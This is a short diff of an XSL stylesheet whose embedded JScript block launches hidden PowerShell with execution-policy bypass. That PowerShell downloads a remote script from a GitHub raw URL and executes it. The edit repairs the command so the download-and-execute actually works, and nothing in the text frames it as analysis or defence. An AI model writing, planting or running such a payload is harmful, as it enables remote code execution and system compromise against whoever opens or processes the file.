@@ -3,7 +3,7 @@
 <output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run "powershell -ep bypass -win 1 -nop IEX('https://raw.githubusercontent.com/section10housing/b1/master/blackswanfinal.ps1')";
+var r = new ActiveXObject("WScript.Shell").Run ("powershell -ep bypass -win 1 -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/blackswanfinal.ps1')");
 ]]> 
 </ms:script>
 </stylesheet>
